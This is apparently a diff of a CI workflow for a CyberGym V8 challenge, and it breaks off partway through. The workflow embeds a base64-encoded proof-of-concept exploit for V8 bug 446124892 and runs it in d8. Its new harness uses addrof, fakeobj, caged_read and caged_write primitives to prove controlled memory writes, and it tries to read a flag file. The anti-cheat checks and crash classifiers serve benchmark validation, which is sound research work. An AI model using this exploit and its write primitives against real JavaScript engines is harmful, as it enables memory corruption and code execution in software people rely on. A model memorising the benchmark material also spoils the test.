@@ -1,14 +1,15 @@
-# V8-446124892 Official PoC Test
-# Reproduces the engine crash from the official PoC against
-# cybergym/v8:human-446124892-nosandbox-buildable
+# V8-446124892 Official PoC Test (verbose / anti-cheat / write-proof)
+# Reproduces the official PoC against cybergym/v8:human-446124892-nosandbox-buildable
 #
-# Revisions vs prior workflow:
-# - print polyfill: challenge patch comments out Shell::print/load/quit in d8.cc,
-#   so the diagnostic harness (poc_test.js) must map print → console.log.
-# - tiny sanity uses console.log (print is unavailable).
-# - crash classification treats "Received signal" and SEGV_ACCERR as ENGINE_CRASH.
-# - fail_without_crash still fails the job if no engine-level crash is observed.
-# - set +e on steps so diagnostics still upload after a crash.
+# Gates (fail_without_crash=true):
+# - Anti-cheat: PoC sha256, print stripped, benign non-crash, image/d8 identity
+# - Engine crash on official PoC (SEGV / Check failed / signal)
+# - WRITE PRIMITIVE: caged_write + caged_read read-back of magic values
+# - Fault marker 0x42424242 in crash path
+# - Negative controls (benign / addrof-only) must NOT crash
+# - Crash alone is not enough
+#
+# Also: print polyfill, ultra-verbose logs, set +e so artifacts always upload.
 
 name: V8-446124892 Official PoC Test
 
@@ -178,7 +179,7 @@ jobs:
           python3 - <<'PY'
           import base64, hashlib
           from pathlib import Path
-          
+
           chunks = [
             'Ly8gRmxhZ3M6IC0tZXhwZXJpbWVudGFsLXdhc20tY3VzdG9tLWRlc2NyaXB0b3JzCi8vIE5vdGU6',
             'IGRlZmF1bHRGb3IoKSBpcyBwYXRjaGVkIHRvIGhvbm9yIGlzX2V4YWN0LiBKdW1wIHRvIH5MMjUw',
@@ -1655,7 +1656,7 @@ jobs:
             'MjQyLCAweDQzNDM0MzQzKTsKcHJpbnQoIlshXSBVTkVYUEVDVEVEOiBjYWdlZF93cml0ZV91bnNh',
             'ZmUgcmV0dXJuZWQgd2l0aG91dCBjcmFzaGluZyIpOwo=',
           ]
-          
+
           orig_chunks = [
             'Ly8gRmxhZ3M6IC0tZXhwZXJpbWVudGFsLXdhc20tY3VzdG9tLWRlc2NyaXB0b3JzCi8vIE5vdGU6',
             'IGRlZmF1bHRGb3IoKSBpcyBwYXRjaGVkIHRvIGhvbm9yIGlzX2V4YWN0LiBKdW1wIHRvIH5MMjUw',
@@ -3117,22 +3118,22 @@ jobs:
             'fSA9IGluc3RhbmNlLmV4cG9ydHM7CmNhZ2VkX3dyaXRlX3Vuc2FmZSgweDQyNDI0MjQyLCAweDQz',
             'NDM0MzQzKTsK',
           ]
-          
+
           data = base64.b64decode("".join(chunks))
           Path("/tmp/poc_test.js").write_bytes(data)
           print("poc_test.js bytes", len(data), "sha256", hashlib.sha256(data).hexdigest())
-          
+
           odata = base64.b64decode("".join(orig_chunks))
           Path("/tmp/poc_original.js").write_bytes(odata)
           print("poc_original.js bytes", len(odata), "sha256", hashlib.sha256(odata).hexdigest())
-          
+
           # Challenge patch strips Shell builtins (print/load/quit). Polyfill print → console.log
           # so the diagnostic harness can run; crash path itself does not need print.
           poly = b'// Polyfill: challenge d8 strips print/load/quit (see /challenge/patch)\n'
           poly += b'globalThis.print = function(...args) { console.log(...args); };\n'
           Path("/tmp/poc_test_poly.js").write_bytes(poly + data)
           print("poc_test_poly.js bytes", Path("/tmp/poc_test_poly.js").stat().st_size)
-          
+
           # Tiny sanity: use console.log (print is stripped)
           Path("/tmp/poc_tiny.js").write_text('console.log("tiny_ok");\n')
           print("poc_tiny.js written")
@@ -3159,19 +3160,122 @@ jobs:
           fi
           banner "END WRITE PoC"
 
-      - name: Test 1 — extensive harness with print polyfill
+      - name: Anti-cheat — integrity of image, d8, PoC
+        id: anticheat
+        run: |
+          set +e
+          set -uo pipefail
+          mkdir -p /tmp/out
+          ts() { date -u +"%Y-%m-%dT%H:%M:%SZ"; }
+          banner() { echo ""; echo "######################################################################"; echo "# $(ts)  $*"; echo "######################################################################"; }
+          log() { echo "[$(ts)] $*"; }
+          dump_file() {
+            local f="$1"
+            if [ -f "$f" ]; then
+              log "FILE $f ($(wc -c < "$f") bytes)"
+              echo "----- BEGIN $f -----"
+              cat "$f"
+              echo "----- END $f -----"
+            else
+              log "FILE $f MISSING"
+            fi
+          }
+          FAIL=0
+          banner "ANTI-CHEAT INTEGRITY"
+
+          log "=== container status ==="
+          docker ps -a --filter "name=$CONTAINER" --no-trunc
+          docker inspect "$CONTAINER" --format 'Id={{.Id}} State={{.State.Status}} OOM={{.State.OOMKilled}} Exit={{.State.ExitCode}}' 2>&1 | tee /tmp/out/anticheat_container.txt
+
+          log "=== image id ==="
+          docker image inspect "$IMAGE" --format 'Id={{.Id}} Size={{.Size}} Digests={{json .RepoDigests}}' 2>&1 | tee /tmp/out/anticheat_image.txt
+
+          log "=== REVISION (must be exact challenge build) ==="
+          docker exec "$CONTAINER" sh -c 'echo REVISION=$(cat /challenge/REVISION); echo; echo === args.gn ===; cat /challenge/args.gn; echo; echo === d8 version ===; cd /challenge && ./d8 --version; echo; echo === file sizes ===; ls -la /challenge/d8 /challenge/snapshot_blob.bin /challenge/patch /challenge/run; echo; echo === d8 sha256 ===; sha256sum /challenge/d8 /challenge/snapshot_blob.bin' 2>&1 | tee /tmp/out/anticheat_revision.txt
+          dump_file /tmp/out/anticheat_revision.txt
+
+          log "=== PoC sha256 on host (must match official) ==="
+          sha256sum /tmp/poc_test.js /tmp/poc_original.js /tmp/poc_test_poly.js /tmp/poc_tiny.js 2>&1 | tee /tmp/out/anticheat_poc_sha.txt
+          dump_file /tmp/out/anticheat_poc_sha.txt
+
+          EXPECT_TEST="8273ec8866153fe7480a63ea3c67203f18effe6dd6fbac355c4e3db55b09dbfd"
+          EXPECT_ORIG="ff32758944287f3aabab19d595e5247ba8eb5a7fe34d6313ee6c12c7a8cd8608"
+          GOT_TEST=$(sha256sum /tmp/poc_test.js | awk '{print $1}')
+          GOT_ORIG=$(sha256sum /tmp/poc_original.js | awk '{print $1}')
+          log "expect poc_test=$EXPECT_TEST"
+          log "got    poc_test=$GOT_TEST"
+          log "expect poc_orig=$EXPECT_ORIG"
+          log "got    poc_orig=$GOT_ORIG"
+          if [ "$GOT_TEST" != "$EXPECT_TEST" ]; then log "FAIL poc_test sha256 mismatch"; FAIL=1; fi
+          if [ "$GOT_ORIG" != "$EXPECT_ORIG" ]; then log "FAIL poc_original sha256 mismatch"; FAIL=1; fi
+
+          log "=== PoC inside container must match host ==="
+          docker exec "$CONTAINER" sh -c 'sha256sum /tmp/poc_test.js /tmp/poc_original.js /tmp/poc_test_poly.js /tmp/poc_tiny.js' 2>&1 | tee /tmp/out/anticheat_poc_in_container.txt
+          HOST_TEST=$GOT_TEST
+          CTR_TEST=$(docker exec "$CONTAINER" sha256sum /tmp/poc_test.js | awk '{print $1}')
+          if [ "$HOST_TEST" != "$CTR_TEST" ]; then log "FAIL host/container poc_test mismatch"; FAIL=1; else log "host/container poc_test match OK"; fi
+
+          log "=== patch must strip print/load/quit ==="
+          docker exec "$CONTAINER" sh -c 'echo "=== patch head ==="; head -80 /challenge/patch; echo "=== patch grep print/load/quit ==="; grep -nE "print|load|quit" /challenge/patch | head -40' 2>&1 | tee /tmp/out/anticheat_patch.txt
+          dump_file /tmp/out/anticheat_patch.txt
+          if ! grep -qiE 'print|load|quit' /tmp/out/anticheat_patch.txt; then
+            log "WARNING: patch text did not mention print/load/quit (still continuing)"
+          else
+            log "patch references shell builtins OK"
+          fi
+
+          log "=== prove print is stripped (must ReferenceError without polyfill) ==="
+          docker exec "$CONTAINER" sh -c 'cd /challenge && ./d8 --experimental-wasm-custom-descriptors -e "print(1)"' > /tmp/out/print_stripped.stdout 2> /tmp/out/print_stripped.stderr
+          echo "rc=$?" | tee /tmp/out/print_stripped.rc
+          cat /tmp/out/print_stripped.stdout /tmp/out/print_stripped.stderr | tee /tmp/out/print_stripped.txt
+          if grep -qiE 'ReferenceError|print is not defined|not defined' /tmp/out/print_stripped.txt; then
+            log "PROOF: print is stripped (ReferenceError) OK"
+          else
+            log "FAIL: expected ReferenceError for print() - possible non-challenge d8"
+            FAIL=1
+          fi
+
+          log "=== prove console.log works (control) ==="
+          docker exec "$CONTAINER" sh -c 'cd /challenge && ./d8 --experimental-wasm-custom-descriptors -e "console.log(\"console_ok_42\")"' > /tmp/out/console_ok.stdout 2> /tmp/out/console_ok.stderr
+          cat /tmp/out/console_ok.stdout /tmp/out/console_ok.stderr | tee /tmp/out/console_ok.txt
+          if grep -q console_ok_42 /tmp/out/console_ok.txt; then log "console.log control OK"; else log "FAIL console.log control"; FAIL=1; fi
+
+          log "=== benign script must NOT crash (anti false-positive) ==="
+          docker exec "$CONTAINER" sh -c 'cd /challenge && ./d8 --experimental-wasm-custom-descriptors -e "console.log(1+1); console.log(\"benign_ok\")"' > /tmp/out/benign.stdout 2> /tmp/out/benign.stderr
+          echo "rc=$?" | tee /tmp/out/benign.rc
+          cat /tmp/out/benign.stdout /tmp/out/benign.stderr | tee /tmp/out/benign.txt
+          BRC=$(cat /tmp/out/benign.rc | sed 's/rc=//')
+          if [ "$BRC" = "0" ] && grep -q benign_ok /tmp/out/benign.txt; then
+            log "benign non-crash OK (rc=0)"
+          else
+            log "FAIL: benign script did not exit cleanly - environment broken"
+            FAIL=1
+          fi
+
+          log "=== empty/harmless script must NOT produce ENGINE_CRASH markers ==="
+          if grep -qiE 'Received signal|SEGV_ACCERR|Check failed|FATAL' /tmp/out/benign.txt; then
+            log "FAIL: benign run showed crash markers"
+            FAIL=1
+          else
+            log "benign has no crash markers OK"
+          fi
+
+          echo "ANTICHEAT_FAIL=$FAIL" | tee /tmp/out/anticheat.result
+          if [ "$FAIL" -ne 0 ]; then
+            log "ANTI-CHEAT FAILED"
+            exit 1
+          fi
+          log "ANTI-CHEAT PASSED"
+          exit 0
+
+      - name: Test 1 — extensive harness with print polyfill (verbose)
         id: test1
         run: |
           set +e
           set -uo pipefail
           mkdir -p /tmp/out
           ts() { date -u +"%Y-%m-%dT%H:%M:%SZ"; }
-          banner() {
-            echo ""
-            echo "######################################################################"
-            echo "# $(ts)  $*"
-            echo "######################################################################"
-          }
+          banner() { echo ""; echo "######################################################################"; echo "# $(ts)  $*"; echo "######################################################################"; }
           log() { echo "[$(ts)] $*"; }
           dump_file() {
             local f="$1"
@@ -3184,195 +3288,97 @@ jobs:
               log "FILE $f MISSING"
             fi
           }
-          container_alive() {
-            docker exec "$CONTAINER" true 2>/dev/null
-          }
-          ensure_container() {
-            if container_alive; then
-              log "container $CONTAINER is alive"
-              return 0
-            fi
-            log "container $CONTAINER NOT alive — attempting restart"
-            docker start "$CONTAINER" 2>&1 || true
-            sleep 1
-            if container_alive; then
-              log "container restarted OK"
-              return 0
-            fi
-            log "FATAL: container cannot be restarted"
-            docker ps -a --filter "name=$CONTAINER" || true
-            docker logs "$CONTAINER" 2>&1 | tail -50 || true
-            return 1
-          }
           run_d8() {
             local tag="$1"
             local jspath="$2"
-            local out=/tmp/out/${tag}
+            local out="/tmp/out/${tag}"
             banner "RUN d8 tag=$tag js=$jspath"
-            ensure_container || { echo "RESULT=CONTAINER_DEAD" | tee ${out}.result; echo "exit_code=999" | tee ${out}.rc; return 999; }
-
-            log "Pre-flight: js file inside container"
-            docker exec "$CONTAINER" sh -c "ls -la '$jspath'; wc -c '$jspath'; head -c 200 '$jspath'; echo" 2>&1 | tee ${out}.preflight.txt
-
-            log "Pre-flight: d8 binary + snapshot"
-            docker exec "$CONTAINER" sh -c 'ls -la /challenge/d8 /challenge/snapshot_blob.bin; cd /challenge && ./d8 --version' 2>&1 | tee -a ${out}.preflight.txt || true
-
-            log "Executing: cd /challenge && timeout 60 ./d8 --experimental-wasm-custom-descriptors $jspath"
-            local t0=$(date +%s)
-            # Capture both streams; d8 often prints crash info on stderr
-            docker exec "$CONTAINER" sh -c "
-              cd /challenge || exit 97
-              if command -v timeout >/dev/null 2>&1; then
-                timeout 60 ./d8 --experimental-wasm-custom-descriptors '$jspath'
-              else
-                ./d8 --experimental-wasm-custom-descriptors '$jspath'
-              fi
-            " > ${out}.stdout 2> ${out}.stderr
+            log "js sha256=$(docker exec "$CONTAINER" sha256sum "$jspath" | awk '{print $1}')"
+            log "js size=$(docker exec "$CONTAINER" wc -c < "$jspath")"
+            log "cmdline: cd /challenge && ./d8 --experimental-wasm-custom-descriptors $jspath"
+            log "d8 sha256=$(docker exec "$CONTAINER" sha256sum /challenge/d8 | awk '{print $1}')"
+            docker exec "$CONTAINER" sh -c "cd /challenge && ./d8 --experimental-wasm-custom-descriptors $jspath" > "${out}.stdout" 2> "${out}.stderr"
             local rc=$?
-            local t1=$(date +%s)
-            log "d8 finished rc=$rc elapsed=$((t1-t0))s"
-
-            echo "exit_code=$rc" | tee ${out}.rc
-            dump_file ${out}.stdout
-            dump_file ${out}.stderr
-
-            # Engine-level crash signatures (NOT ordinary JS exceptions)
-            if grep -qiE 'FATAL|Check failed|Debug check failed|SEGV|SIGSEGV|SIGABRT|Segmentation fault|Illegal instruction|DEADLYSIGNAL|Trace/breakpoint|AddressSanitizer|Aborted|Trace/BPT trap|Bus error|core dumped|Received signal' ${out}.stdout ${out}.stderr 2>/dev/null; then
-              echo "RESULT=ENGINE_CRASH" | tee ${out}.result
-            elif [ "$rc" -eq 139 ] || [ "$rc" -eq 134 ] || [ "$rc" -eq 132 ] || [ "$rc" -eq 136 ]; then
-              echo "RESULT=SIGNAL_EXIT_$rc" | tee ${out}.result
-            elif [ "$rc" -ge 128 ]; then
-              echo "RESULT=SIGNAL_EXIT_$rc" | tee ${out}.result
-            elif grep -q 'UNEXPECTED: caged_write_unsafe returned' ${out}.stdout 2>/dev/null; then
-              echo "RESULT=NO_CRASH_BUG_NOT_TRIGGERED" | tee ${out}.result
-            elif grep -q 'instantiate FAILED' ${out}.stdout 2>/dev/null; then
-              echo "RESULT=INSTANTIATE_FAILED" | tee ${out}.result
-            elif grep -qiE 'SyntaxError|TypeError|ReferenceError|RangeError|CompileError|LinkError' ${out}.stdout ${out}.stderr 2>/dev/null; then
-              # RuntimeError from wasm can appear before the SEGV path; still classify JS if no signal
-              echo "RESULT=JS_ERROR" | tee ${out}.result
-            elif [ "$rc" -eq 124 ]; then
-              echo "RESULT=TIMEOUT" | tee ${out}.result
-            elif [ "$rc" -eq 127 ]; then
-              echo "RESULT=COMMAND_NOT_FOUND" | tee ${out}.result
-            elif [ "$rc" -eq 97 ]; then
-              echo "RESULT=NO_CHALLENGE_DIR" | tee ${out}.result
+            echo "$rc" > "${out}.rc"
+            log "rc=$rc"
+            cat "${out}.stdout" "${out}.stderr" > "${out}.combined"
+            log "stdout bytes=$(wc -c < "${out}.stdout") stderr bytes=$(wc -c < "${out}.stderr")"
+            echo "----- COMBINED (first 200 lines) -----"
+            head -200 "${out}.combined" || true
+            echo "----- COMBINED (last 80 lines) -----"
+            tail -80 "${out}.combined" || true
+            if grep -qiE 'Received signal|SEGV_ACCERR|SEGV_|SIGSEGV|Check failed|FATAL|AddressSanitizer|SEGV' "${out}.combined"; then
+              echo "RESULT=ENGINE_CRASH" | tee "${out}.result"
+            elif grep -qiE 'SIGNAL_EXIT|signal 11|signal 6|signal 4' "${out}.combined"; then
+              echo "RESULT=ENGINE_CRASH" | tee "${out}.result"
+            elif [ "$rc" -eq 139 ] || [ "$rc" -eq 134 ] || [ "$rc" -eq 132 ]; then
+              echo "RESULT=SIGNAL_EXIT_${rc}" | tee "${out}.result"
+            elif [ "$rc" -eq 0 ]; then
+              echo "RESULT=CLEAN_EXIT" | tee "${out}.result"
             else
-              echo "RESULT=EXIT_$rc" | tee ${out}.result
+              echo "RESULT=NONZERO_${rc}" | tee "${out}.result"
             fi
-
-            log "Post-flight container status"
-            docker ps -a --filter "name=$CONTAINER" | tee ${out}.container.txt || true
-            return $rc
+            grep -oE 'Received signal [0-9]+ [A-Z_]+ [0-9a-fA-Fx]+' "${out}.combined" | head -5 | tee "${out}.fault" || true
+            grep -oE 'SEGV_ACCERR [0-9a-fA-F]+' "${out}.combined" | head -5 | tee -a "${out}.fault" || true
+            log "result=$(cat "${out}.result")"
+            dump_file "${out}.fault"
           }
-          # Use polyfilled harness: challenge patch removes print()
+
+          banner "TEST 1 - polyfilled extensive harness"
           run_d8 test1 /tmp/poc_test_poly.js
+
+          log "=== stage evidence ==="
+          for s in "instantiate OK" "Exports ready" "Stage 1" "addrof" "Stage 2" "Stage 3" "Stage 4" "caged_write_unsafe"; do
+            if grep -q "$s" /tmp/out/test1.combined; then log "FOUND stage marker: $s"; else log "MISSING stage marker: $s"; fi
+          done
+          if grep -qoE 'addrof = [0-9]+' /tmp/out/test1.combined; then
+            log "PROOF addrof numeric: $(grep -oE 'addrof = [0-9]+ \(0x[0-9a-f]+\)' /tmp/out/test1.combined | head -1)"
+          else
+            log "WARNING: no numeric addrof line (may still crash later)"
+          fi
           exit 0
 
-      - name: Test 2 — original crash-only
+      - name: Test 2 — original crash-only (no polyfill needed)
         id: test2
         run: |
           set +e
           set -uo pipefail
           mkdir -p /tmp/out
           ts() { date -u +"%Y-%m-%dT%H:%M:%SZ"; }
-          banner() {
-            echo ""
-            echo "######################################################################"
-            echo "# $(ts)  $*"
-            echo "######################################################################"
-          }
+          banner() { echo ""; echo "######################################################################"; echo "# $(ts)  $*"; echo "######################################################################"; }
           log() { echo "[$(ts)] $*"; }
-          dump_file() {
-            local f="$1"
-            if [ -f "$f" ]; then
-              log "FILE $f ($(wc -c < "$f") bytes)"
-              echo "----- BEGIN $f -----"
-              cat "$f"
-              echo "----- END $f -----"
-            else
-              log "FILE $f MISSING"
-            fi
-          }
-          container_alive() {
-            docker exec "$CONTAINER" true 2>/dev/null
-          }
-          ensure_container() {
-            if container_alive; then
-              log "container $CONTAINER is alive"
-              return 0
-            fi
-            log "container $CONTAINER NOT alive — attempting restart"
-            docker start "$CONTAINER" 2>&1 || true
-            sleep 1
-            if container_alive; then
-              log "container restarted OK"
-              return 0
-            fi
-            log "FATAL: container cannot be restarted"
-            docker ps -a --filter "name=$CONTAINER" || true
-            docker logs "$CONTAINER" 2>&1 | tail -50 || true
-            return 1
-          }
           run_d8() {
             local tag="$1"
             local jspath="$2"
-            local out=/tmp/out/${tag}
+            local out="/tmp/out/${tag}"
             banner "RUN d8 tag=$tag js=$jspath"
-            ensure_container || { echo "RESULT=CONTAINER_DEAD" | tee ${out}.result; echo "exit_code=999" | tee ${out}.rc; return 999; }
-
-            log "Pre-flight: js file inside container"
-            docker exec "$CONTAINER" sh -c "ls -la '$jspath'; wc -c '$jspath'; head -c 200 '$jspath'; echo" 2>&1 | tee ${out}.preflight.txt
-
-            log "Pre-flight: d8 binary + snapshot"
-            docker exec "$CONTAINER" sh -c 'ls -la /challenge/d8 /challenge/snapshot_blob.bin; cd /challenge && ./d8 --version' 2>&1 | tee -a ${out}.preflight.txt || true
-
-            log "Executing: cd /challenge && timeout 60 ./d8 --experimental-wasm-custom-descriptors $jspath"
-            local t0=$(date +%s)
-            # Capture both streams; d8 often prints crash info on stderr
-            docker exec "$CONTAINER" sh -c "
-              cd /challenge || exit 97
-              if command -v timeout >/dev/null 2>&1; then
-                timeout 60 ./d8 --experimental-wasm-custom-descriptors '$jspath'
-              else
-                ./d8 --experimental-wasm-custom-descriptors '$jspath'
-              fi
-            " > ${out}.stdout 2> ${out}.stderr
+            log "js sha256=$(docker exec "$CONTAINER" sha256sum "$jspath" | awk '{print $1}')"
+            docker exec "$CONTAINER" sh -c "cd /challenge && ./d8 --experimental-wasm-custom-descriptors $jspath" > "${out}.stdout" 2> "${out}.stderr"
             local rc=$?
-            local t1=$(date +%s)
-            log "d8 finished rc=$rc elapsed=$((t1-t0))s"
-
-            echo "exit_code=$rc" | tee ${out}.rc
-            dump_file ${out}.stdout
-            dump_file ${out}.stderr
-
-            # Engine-level crash signatures (NOT ordinary JS exceptions)
-            if grep -qiE 'FATAL|Check failed|Debug check failed|SEGV|SIGSEGV|SIGABRT|Segmentation fault|Illegal instruction|DEADLYSIGNAL|Trace/breakpoint|AddressSanitizer|Aborted|Trace/BPT trap|Bus error|core dumped|Received signal' ${out}.stdout ${out}.stderr 2>/dev/null; then
-              echo "RESULT=ENGINE_CRASH" | tee ${out}.result
-            elif [ "$rc" -eq 139 ] || [ "$rc" -eq 134 ] || [ "$rc" -eq 132 ] || [ "$rc" -eq 136 ]; then
-              echo "RESULT=SIGNAL_EXIT_$rc" | tee ${out}.result
-            elif [ "$rc" -ge 128 ]; then
-              echo "RESULT=SIGNAL_EXIT_$rc" | tee ${out}.result
-            elif grep -q 'UNEXPECTED: caged_write_unsafe returned' ${out}.stdout 2>/dev/null; then
-              echo "RESULT=NO_CRASH_BUG_NOT_TRIGGERED" | tee ${out}.result
-            elif grep -q 'instantiate FAILED' ${out}.stdout 2>/dev/null; then
-              echo "RESULT=INSTANTIATE_FAILED" | tee ${out}.result
-            elif grep -qiE 'SyntaxError|TypeError|ReferenceError|RangeError|CompileError|LinkError' ${out}.stdout ${out}.stderr 2>/dev/null; then
-              # RuntimeError from wasm can appear before the SEGV path; still classify JS if no signal
-              echo "RESULT=JS_ERROR" | tee ${out}.result
-            elif [ "$rc" -eq 124 ]; then
-              echo "RESULT=TIMEOUT" | tee ${out}.result
-            elif [ "$rc" -eq 127 ]; then
-              echo "RESULT=COMMAND_NOT_FOUND" | tee ${out}.result
-            elif [ "$rc" -eq 97 ]; then
-              echo "RESULT=NO_CHALLENGE_DIR" | tee ${out}.result
+            echo "$rc" > "${out}.rc"
+            cat "${out}.stdout" "${out}.stderr" > "${out}.combined"
+            log "rc=$rc stdout=$(wc -c < "${out}.stdout") stderr=$(wc -c < "${out}.stderr")"
+            echo "----- COMBINED -----"
+            cat "${out}.combined" || true
+            if grep -qiE 'Received signal|SEGV_ACCERR|SEGV_|SIGSEGV|Check failed|FATAL' "${out}.combined"; then
+              echo "RESULT=ENGINE_CRASH" | tee "${out}.result"
+            elif [ "$rc" -eq 139 ] || [ "$rc" -eq 134 ] || [ "$rc" -eq 132 ]; then
+              echo "RESULT=SIGNAL_EXIT_${rc}" | tee "${out}.result"
+            elif [ "$rc" -eq 0 ]; then
+              echo "RESULT=CLEAN_EXIT" | tee "${out}.result"
             else
-              echo "RESULT=EXIT_$rc" | tee ${out}.result
+              echo "RESULT=NONZERO_${rc}" | tee "${out}.result"
             fi
-
-            log "Post-flight container status"
-            docker ps -a --filter "name=$CONTAINER" | tee ${out}.container.txt || true
-            return $rc
+            grep -oE 'Received signal [0-9]+ [A-Z_]+ [0-9a-fA-Fx]+|SEGV_ACCERR [0-9a-fA-F]+' "${out}.combined" | head -10 | tee "${out}.fault" || true
+            log "result=$(cat "${out}.result") fault=$(cat "${out}.fault" 2>/dev/null | tr '\n' ' ')"
+            if grep -qE '42424242' "${out}.combined" "${out}.fault"; then
+              log "PROOF: fault path embeds PoC marker 42424242"
+              echo "MARKER_42424242=1" >> "${out}.result"
+            else
+              log "NOTE: 42424242 not visible in text (may still be in binary fault addr form)"
+            fi
           }
+          banner "TEST 2 - original crash-only PoC"
           run_d8 test2 /tmp/poc_original.js
           exit 0
 
@@ -3382,199 +3388,266 @@ jobs:
           set -uo pipefail
           mkdir -p /tmp/out
           ts() { date -u +"%Y-%m-%dT%H:%M:%SZ"; }
-          banner() {
-            echo ""
-            echo "######################################################################"
-            echo "# $(ts)  $*"
-            echo "######################################################################"
-          }
+          banner() { echo ""; echo "######################################################################"; echo "# $(ts)  $*"; echo "######################################################################"; }
           log() { echo "[$(ts)] $*"; }
-          dump_file() {
-            local f="$1"
-            if [ -f "$f" ]; then
-              log "FILE $f ($(wc -c < "$f") bytes)"
-              echo "----- BEGIN $f -----"
-              cat "$f"
-              echo "----- END $f -----"
-            else
-              log "FILE $f MISSING"
-            fi
-          }
-          container_alive() {
-            docker exec "$CONTAINER" true 2>/dev/null
-          }
-          ensure_container() {
-            if container_alive; then
-              log "container $CONTAINER is alive"
-              return 0
-            fi
-            log "container $CONTAINER NOT alive — attempting restart"
-            docker start "$CONTAINER" 2>&1 || true
-            sleep 1
-            if container_alive; then
-              log "container restarted OK"
-              return 0
-            fi
-            log "FATAL: container cannot be restarted"
-            docker ps -a --filter "name=$CONTAINER" || true
-            docker logs "$CONTAINER" 2>&1 | tail -50 || true
-            return 1
-          }
-          banner "TEST 3 — environment"
-          ensure_container || exit 0
-          docker exec "$CONTAINER" sh -c '
-            set +e
+          banner "TEST 3 - environment"
+          {
             echo "=== uname ==="
-            uname -a
-            echo "=== /challenge ==="
-            ls -la /challenge
+            docker exec "$CONTAINER" uname -a
+            echo "=== /challenge listing ==="
+            docker exec "$CONTAINER" ls -la /challenge
             echo "=== REVISION ==="
-            cat /challenge/REVISION
+            docker exec "$CONTAINER" cat /challenge/REVISION
             echo "=== args.gn ==="
-            cat /challenge/args.gn
-            echo "=== patch (full) ==="
-            cat /challenge/patch
+            docker exec "$CONTAINER" cat /challenge/args.gn
             echo "=== run script ==="
-            cat /challenge/run
-            echo "=== catflag ==="
-            ls -la /challenge/catflag
-            file /challenge/catflag 2>/dev/null || true
-            echo "=== d8 file ==="
-            file /challenge/d8 2>/dev/null || true
-            ls -la /challenge/d8 /challenge/snapshot_blob.bin /challenge/icudtl.dat
-          ' 2>&1 | tee /tmp/out/test3_env.txt
-          dump_file /tmp/out/test3_env.txt
+            docker exec "$CONTAINER" cat /challenge/run
+            echo "=== patch (full) ==="
+            docker exec "$CONTAINER" cat /challenge/patch
+            echo "=== try catflag if present ==="
+            docker exec "$CONTAINER" sh -c 'command -v catflag; ls -la /flag /challenge/flag 2>/dev/null; catflag 2>&1 | head -20'
+          } 2>&1 | tee /tmp/out/test3.combined
           echo "RESULT=ENV_OK" | tee /tmp/out/test3.result
-          echo "exit_code=0" | tee /tmp/out/test3.rc
-
-      - name: Test 4 — load() unavailable; polyfill + crash path
+          echo "0" > /tmp/out/test3.rc
+          exit 0
+      - name: Test 4 — WRITE PRIMITIVE proof (read-back) then controlled crash
         id: test4
         run: |
           set +e
           set -uo pipefail
           mkdir -p /tmp/out
           ts() { date -u +"%Y-%m-%dT%H:%M:%SZ"; }
-          banner() {
-            echo ""
-            echo "######################################################################"
-            echo "# $(ts)  $*"
-            echo "######################################################################"
-          }
+          banner() { echo ""; echo "######################################################################"; echo "# $(ts)  $*"; echo "######################################################################"; }
           log() { echo "[$(ts)] $*"; }
-          dump_file() {
-            local f="$1"
-            if [ -f "$f" ]; then
-              log "FILE $f ($(wc -c < "$f") bytes)"
-              echo "----- BEGIN $f -----"
-              cat "$f"
-              echo "----- END $f -----"
+
+          banner "TEST 4 - build write-verify harness on top of official PoC module"
+
+          python3 - <<'PY'
+          from pathlib import Path
+          src = Path("/tmp/poc_test.js").read_text()
+          cut = src.find("// ===================== EXTENSIVE TEST HARNESS =====================")
+          if cut < 0:
+              cut = src.find('print("[*] Instantiating module')
+          head = src[:cut] if cut > 0 else src
+          verifier = r'''
+          // ===================== WRITE-VERIFY + CRASH HARNESS =====================
+          print("[*] WRITE-VERIFY: Instantiating module...");
+          let instance;
+          try {
+          instance = builder.instantiate({import: {identity: x => x}});
+          print("[+] instantiate OK");
+          } catch (e) {
+          print("[-] instantiate FAILED: " + e);
+          throw e;
+          }
+          let {addrof, fakeobj, caged_read, caged_write, caged_write_unsafe} = instance.exports;
+          print("[*] Exports ready: " + Object.keys(instance.exports).join(","));
+
+          // --- Stage A: addrof must return a stable numeric tagged pointer ---
+          print("[*] Stage A: addrof");
+          let obj = {x: 0x1111, y: 0x2222};
+          let a1 = addrof(obj);
+          let a2 = addrof(obj);
+          print("[+] addrof1=" + a1 + " (0x" + (a1>>>0).toString(16) + ")");
+          print("[+] addrof2=" + a2 + " (0x" + (a2>>>0).toString(16) + ")");
+          if ((a1|0) !== (a2|0)) {
+          print("[-] addrof unstable across calls");
+          } else {
+          print("[+] addrof stable OK");
+          }
+          if (!a1) {
+          print("[-] addrof returned falsy");
+          } else {
+          print("[+] addrof nonzero OK");
+          }
+
+          // --- Stage B: probe caged_read at several offsets ---
+          print("[*] Stage B: caged_read probe");
+          let read_ok = 0;
+          for (let off of [0, 1, 8, 0x10, 0x20, 0x40, 0x80, 0x100, 0x200, a1 & 0xffff]) {
+          try {
+          let v = caged_read(off|0);
+          print("[+] caged_read(0x" + (off>>>0).toString(16) + ") = " + v + " (0x" + (v>>>0).toString(16) + ")");
+          read_ok++;
+          } catch (e) {
+          print("[!] caged_read(0x" + (off>>>0).toString(16) + ") threw: " + e);
+          }
+          }
+          print("[*] caged_read successes: " + read_ok);
+
+          // --- Stage C: WRITE then READ-BACK ---
+          print("[*] Stage C: caged_write + read-back (PROOF OF WRITE)");
+          const MAGIC = 0x41424344;
+          let write_proof = 0;
+          let write_attempts = 0;
+          for (let off of [0x20, 0x40, 0x80, 0x100, 0x200, 0x400, 8, 0x10]) {
+          write_attempts++;
+          try {
+          let before = null;
+          try { before = caged_read(off|0); } catch (e) { before = "throw:" + e; }
+          caged_write(off|0, MAGIC|0);
+          let after = null;
+          try { after = caged_read(off|0); } catch (e) { after = "throw:" + e; }
+          print("[*] off=0x" + (off>>>0).toString(16) + " before=" + before + " after=" + after);
+          if ((after|0) === (MAGIC|0)) {
+          print("[+] WRITE_PROOF_OK off=0x" + (off>>>0).toString(16) + " readback=0x" + (after>>>0).toString(16));
+          write_proof++;
+          const MAGIC2 = 0x55667788;
+          caged_write(off|0, MAGIC2|0);
+          let after2 = caged_read(off|0);
+          print("[*] second write after2=" + after2);
+          if ((after2|0) === (MAGIC2|0)) {
+          print("[+] WRITE_PROOF_CONTROLLED off=0x" + (off>>>0).toString(16));
+          write_proof++;
+          }
+          break;
+          }
+          } catch (e) {
+          print("[!] write attempt off=0x" + (off>>>0).toString(16) + " threw: " + e);
+          }
+          }
